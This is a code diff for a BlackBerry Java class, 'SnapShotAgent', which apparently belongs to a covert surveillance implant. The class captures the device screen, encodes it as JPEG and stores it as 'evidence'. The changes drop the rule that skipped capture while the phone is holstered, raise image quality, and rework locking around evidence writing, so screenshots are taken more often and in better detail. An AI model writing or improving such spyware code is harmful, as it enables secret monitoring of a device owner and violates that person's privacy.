@@ -13,7 +13,6 @@ import java.io.EOFException;
 
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
-import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
@@ -37,7 +36,7 @@ public final class SnapShotAgent extends Agent {
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
 
-    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 60;
+    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
     private static final int MIN_TIMER = 1 * 1000;
     private static final long SNAPSHOT_DELAY = 1000;
@@ -84,13 +83,6 @@ public final class SnapShotAgent extends Agent {
         debug.trace("Taking snapshot");
         //#endif
 
-        if (DeviceInfo.isInHolster()) {
-            //#ifdef DEBUG
-            debug.trace("In Holster, skipping snapshot");
-            //#endif
-            return;
-        }
-
         if (!Backlight.isEnabled()) {
             //#ifdef DEBUG
             debug.trace("No backlight, skipping snapshot");
@@ -113,7 +105,8 @@ public final class SnapShotAgent extends Agent {
         //#ifdef DBC
         Check.requires(evidence != null, "Null log");
         //#endif
-        synchronized (evidence) {
+        
+        synchronized (evidenceLock) {
             evidence.createEvidence(getAdditionalData());
             evidence.writeEvidence(plain);
             evidence.close();
@@ -128,7 +121,7 @@ public final class SnapShotAgent extends Agent {
     /**
      * @return
      */
-    public synchronized static Bitmap getScreenshot() {
+    public static Bitmap getScreenshot() {
         final Bitmap bitmap;
 
         final int width = Display.getWidth();
